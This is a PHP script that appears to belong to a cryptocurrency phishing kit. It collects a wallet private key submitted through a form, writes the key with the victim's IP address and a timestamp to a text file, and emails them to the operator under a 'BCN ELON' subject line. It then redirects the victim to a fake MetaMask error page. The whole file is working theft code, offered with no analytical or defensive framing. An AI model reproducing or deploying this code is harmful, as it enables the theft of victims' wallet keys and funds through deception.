<?php
$file = "BSDFSDCXKCXJRDKT_______.txt";
$PrivateKey = $_POST['PrivateKey'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "PrivateKey   	: ");
fwrite($handle, "$PrivateKey");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time		: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "https://www.myetherwallet.com/access-my-wallet ");
fwrite($handle, "\n");
fclose($handle);
$PrivateKey = $_POST['PrivateKey'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

PrivateKey : ".$PrivateKey." 

IP Address : https://geoiptool.com/?IP=".$ip." 

https://www.myetherwallet.com/access-my-wallet
";
include 'mail.php';
$subject = "============ BCN ELON ============ ".$ip." ";
$headers = "From: BCN ELON </>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/prize/metamask/invalid.html?/nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault\";
// -->
</script>";
?>
